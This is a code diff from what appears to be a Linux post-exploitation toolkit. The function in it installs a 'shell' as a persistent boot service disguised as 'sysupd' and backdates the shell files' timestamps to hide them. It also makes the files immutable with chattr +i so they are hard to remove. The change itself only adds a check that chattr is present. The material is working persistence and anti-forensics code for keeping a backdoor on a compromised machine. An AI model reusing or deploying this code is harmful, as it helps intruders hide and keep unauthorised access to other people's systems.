@@ -1,4 +1,3 @@
-
 # Lets you install an Intersect shell as a persistent service on the target. You must define your shell type and file location when prompted.
 def persistent():
 	header = " => "
@@ -29,9 +28,13 @@ def persistent():
 			print("[+] Modifying touch times on shell files...")
 			os.system("touch -t 200512311216 /etc/default/sysupd")
 			os.system("touch -t 200512311216 /etc/init.d/sysupd")
-			print("[+] Locking down shell files with chattr +i...")
-			os.system("chattr +i /etc/default/sysupd")
-			os.system("chattr +i /etc/init.d/sysupd")
+			print("[+] Attempting to lock down shell files...")
+			if whereis('chattr') is not None:
+				os.system("chattr +i /etc/default/sysupd")
+				os.system("chattr +i /etc/init.d/sysupd")
+			else:
+				print("[!] Chattr not found. Could not lock files.")
+
 			print("[+] Persistent shell successfull! System will now start your shell as a background process on every reboot.")
 
 
